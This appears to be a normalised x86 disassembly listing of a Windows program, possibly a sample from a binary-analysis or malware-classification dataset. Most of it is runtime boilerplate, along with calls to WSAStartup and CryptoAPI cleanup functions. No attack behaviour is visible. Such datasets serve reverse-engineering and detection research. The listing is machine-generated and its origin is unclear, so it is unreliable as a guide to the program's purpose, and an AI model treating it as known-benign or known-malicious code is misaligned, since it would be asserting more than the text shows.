je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_41d11c
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_41d1aa
push eax
mov [ ebp - 0xc ] eax
call sub_41d740
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_41d55c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_41d740
push 0x8
push r--data
call sub_415830
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_415875
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_41dfe2
mov eax sub_41df45
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
and [ ebp - 0x4 ] 0x0
call sub_4046cc
push rw-data
call sub_405caf
or [ ebp - 0x4 ] 0xffffffff
push sub_41ea82
call sub_413278
pop ecx
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e040
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ WSAStartup@IAT ]
push WSACleanup
call sub_413278
pop ecx
mov esp ebp
pop ebp
retn
sub_41e0ba
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_407ccd
mov [ esp + 0x10 ] 0x70737200
mov [ esp + 0x14 ] 0x64
call sub_4046cc
mov esi eax
call sub_404329
pop esi
mov esp ebp
pop ebp
retn
sub_41e0fe
mov eax sub_41dfbd
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41eb61
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e131
mov eax sub_41dfa9
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41eb91
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e164
mov eax sub_41df95
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41ebc1
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e197
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_408a8a
mov [ esp + 0x10 ] 0x70941101
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x0
call sub_4046cc
mov esi eax
call sub_404329
pop esi
mov esp ebp
pop ebp
retn
sub_41e1e3
mov eax sub_41dee0
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41ebf1
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e22e
mov eax sub_41def4
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41ec2e
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e261
mov eax sub_41df08
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41ec5e
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e294
mov eax sub_41df81
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41ec8e
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e2c7
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_4093c3
mov [ esp + 0x10 ] 0x70243101
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_4046cc
mov esi eax
call sub_404329
pop esi
mov esp ebp
pop ebp
retn
sub_41e34e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_409f4f
mov [ esp + 0x10 ] 0x70aa0201
mov [ esp + 0x14 ] 0x5a
call sub_4046cc
mov esi eax
call sub_404329
pop esi
mov esp ebp
pop ebp
retn
sub_41e392
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40a19d
mov [ esp + 0x10 ] 0x74447101
mov [ esp + 0x14 ] 0x5f
call sub_4046cc
mov esi eax
call sub_404329
pop esi
mov esp ebp
pop ebp
retn
sub_41e3d6
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov [ ebp - 0x14 ] sub_40a373
mov [ ebp - 0x10 ] 0x10a7b701
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x8 ] 0x0
call sub_4046cc
lea ebx [ ebp - 0x14 ]
mov esi eax
call sub_4040c8
pop esi
pop ebx
leave
retn
sub_41e40a
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov [ ebp - 0x14 ] sub_40ac4b
mov [ ebp - 0x10 ] 0x10000301
mov [ ebp - 0xc ] 0x32
mov [ ebp - 0x8 ] 0x0
call sub_4046cc
lea ebx [ ebp - 0x14 ]
mov esi eax
call sub_4040c8
pop esi
pop ebx
leave
retn
sub_41e43e
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov [ ebp - 0x14 ] sub_40afe2
mov [ ebp - 0x10 ] 0x10212201
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x8 ] 0x0
call sub_4046cc
lea ebx [ ebp - 0x14 ]
mov esi eax
call sub_4040c8
pop esi
pop ebx
leave
retn
sub_41e472
push ebx
push esi
mov [ rw-data ] sub_40b228
mov [ rw-data ] 0x40412402
mov [ rw-data ] 0x64
mov [ rw-data ] 0x927c0
call sub_4046cc
mov ebx rw-data
mov esi eax
call sub_4041ff
pop esi
pop ebx
retn
sub_41e4b0
push ebx
push esi
mov [ rw-data ] sub_40b8b2
mov [ rw-data ] 0x40211202
mov [ rw-data ] 0x50
mov [ rw-data ] 0x927c0
call sub_4046cc
mov ebx rw-data
mov esi eax
call sub_4041ff
pop esi
pop ebx
retn
sub_41e4ee
push ebx
push esi
mov [ rw-data ] sub_40bbd1
mov [ rw-data ] 0x40920001
mov [ rw-data ] 0x32
mov [ rw-data ] 0xdbba0
call sub_4046cc
mov ebx rw-data
mov esi eax
call sub_4041ff
pop esi
pop ebx
retn
sub_41e616
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40e1a4
mov [ esp + 0x10 ] 0x80c61103
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e662
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40e344
mov [ esp + 0x10 ] 0x80399101
mov [ esp + 0x14 ] 0x2d
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e6be
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40e976
mov [ esp + 0x10 ] 0x80a5f801
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e70a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40f13a
mov [ esp + 0x10 ] 0x80673201
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e756
mov eax sub_41df6d
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41ecef
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e789
mov eax sub_41df59
call sub_4198ec
push esi
mov esi rw-data
call sub_405d11
or [ esp + 0xc ] 0xffffffff
push sub_41ed1f
call sub_413278
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e7bc
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40f84a
mov [ esp + 0x10 ] 0x80780001
mov [ esp + 0x14 ] 0x31
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e83b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40fae1
mov [ esp + 0x10 ] 0x80cd9101
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e89f
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_410292
mov [ esp + 0x10 ] 0x80361901
mov [ esp + 0x14 ] 0x3e8
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e91e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_410d27
mov [ esp + 0x10 ] 0x8094e303
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e96a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_4118bf
mov [ esp + 0x10 ] 0x80156501
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e9b6
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_41216f
mov [ esp + 0x10 ] 0x80770001
mov [ esp + 0x14 ] 0x3b
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41e9fa
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_4122cf
mov [ esp + 0x10 ] 0x80f80001
mov [ esp + 0x14 ] 0x46
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41ea3e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4025c1
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_412aef
mov [ esp + 0x10 ] 0x80760002
mov [ esp + 0x14 ] 0x43
call sub_4046cc
mov esi eax
call sub_404281
pop esi
mov esp ebp
pop ebp
retn
sub_41ea82
mov eax sub_41df45
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
call sub_4046cc
push rw-data
call [ DeleteCriticalSection@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov esi rw-data
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41eabc
mov eax sub_41df1c
call sub_4198ec
push ebx
push esi
and [ ebp - 0x4 ] 0x0
mov esi [ DeleteCriticalSection@IAT ]
push rw-data
call esi
push rw-data
call esi
push rw-data
call esi
push [ rw-data ]
call [ CloseHandle@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ebx rw-data
call sub_402593
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_41eb61
mov eax sub_41dfbd
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41eb91
mov eax sub_41dfa9
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ebc1
mov eax sub_41df95
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ebf1
mov eax sub_41dee0
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ec2e
mov eax sub_41def4
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ec5e
mov eax sub_41df08
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ec8e
mov eax sub_41df81
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ecef
mov eax sub_41df6d
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ed1f
mov eax sub_41df59
call sub_4198ec
push esi
and [ ebp - 0x4 ] 0x0
mov esi rw-data
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40131f
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4015d2
push esi
lea esi [ edi + 0x4 ]
call sub_405f3e
lea esi [ edi + 0x14 ]
call sub_405f3e
mov al 0x1
pop esi
retn
sub_401e14
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_401fe5
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40258f
mov eax [ ecx + 0xc ]
retn
sub_40264d
push sub_402659
call sub_41385a
pop ecx
retn
sub_4026cc
mov eax sub_41d7e6
call sub_4198ec
push ecx
mov [ ebp - 0x10 ] ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_413803
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4026ef
mov eax sub_41d7cc
call sub_4198ec
push ecx
mov [ ebp - 0x10 ] ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_413803
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_40288a
xor eax eax
retn 0x4
sub_402bc9
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al 0x1
push [ esp + 0x4 ]
call eax
neg eax
sbb eax eax
neg eax
jmp r-xdata
retn 0x4
sub_40354f
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax [ rw-data ]
retn
and [ rw-data ] 0x0
call sub_404726
sub_4043b8
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
inc [ eax ]
or [ ebp - 0x4 ] 0xffffffff
mov eax sub_4043ca
retn
sub_404504
mov eax [ ebp + 0x8 ]
inc [ eax + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov eax sub_404514
retn
sub_40461d
mov eax [ ebp + 0x8 ]
inc [ eax + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_405caf
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
mov al 0x1
xor al al
jmp r-xdata
retn 0x4
sub_4061c3
push edi
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push 0x4
pop edi
call sub_406173
pop edi
retn 0x8
sub_4066d6
push rw-data
call [ LeaveCriticalSection@IAT ]
retn
sub_407f74
mov eax [ esp + 0x10 ]
cmp [ eax ] 0x0
sete al
retn
sub_40866c
mov [ ebp - 0x4 ] 0x5
mov eax sub_408679
retn
sub_408fb0
push ecx
and [ rw-data ] 0x0
and [ rw-data ] 0x0
call sub_403925
mov [ rw-data ] eax
pop ecx
retn
sub_409799
cmp [ esp + 0x8 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push [ esp + 0x8 ]
call [ CryptDestroyKey@IAT ]
retn
push 0x0
push [ esp + 0x8 ]
call [ CryptReleaseContext@IAT ]
sub_41314a
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4152db
sub_413272
call sub_41558a
retn
sub_413278
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_41323c
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_413718
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_413678
pop ecx
pop ecx
pop ebp
retn
sub_41372b
mov eax ecx
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x0
retn
sub_41373c
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_413789
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_4152db
pop ecx
sub_413803
mov [ ecx ] r--data
jmp sub_413789
sub_41387e
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_416ac0
pop ecx
retn
sub_4150c6
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_417005
pop ecx
pop ecx
retn
sub_4150da
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_4157fc
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_415875
retn
push eax
call sub_4157d7
_start
call sub_417825
jmp sub_414f97
sub_415211
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_4153a9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_415569
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_41553e
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_415581
push 0x8
call sub_417a3a
pop ecx
retn
sub_41558a
push 0x8
call sub_417961
pop ecx
retn
sub_4157ac
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_417961
pop ecx
sub_4157c1
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_415681
add esp 0xc
pop ebp
retn
sub_4157d7
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_415681
add esp 0xc
pop ebp
retn
sub_4157ed
push 0x1
push 0x0
push 0x0
call sub_415681
add esp 0xc
retn
sub_4157fc
push 0x1
push 0x1
push 0x0
call sub_415681
add esp 0xc
retn
sub_41580b
mov edi edi
push ebp
mov ebp esp
call sub_416fcc
push [ ebp + 0x8 ]
call sub_416e1d
pop ecx
push 0xff
call sub_4157d7
